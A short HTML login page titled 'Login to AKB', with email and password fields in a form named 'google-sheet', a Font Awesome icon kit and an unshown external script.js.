<!DOCTYPE html>
<html>

<head>
    <script src="https://kit.fontawesome.com/72f28316c6.js" crossorigin="anonymous"></script>
    <title>Login to AKB</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="titleimg.png">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <form method="POST" name="google-sheet">
    <div class="container">
        <h1>Log In</h1>
        <div class="box">
            <i class="fa fa-user"></i>
            <input type="email" name="email" id="email" placeholder="Enter your email" required autofocus>

        </div>
        <div class="box">
            <i class="fa fa-key"></i>
            <input type="password" name="password" id="password" placeholder="Enter your password">


        </div>
        <input class="btn" type="Submit" name="Submit">

    </div>
    </form>
    <script src="script.js"></script>
</body>

</html>
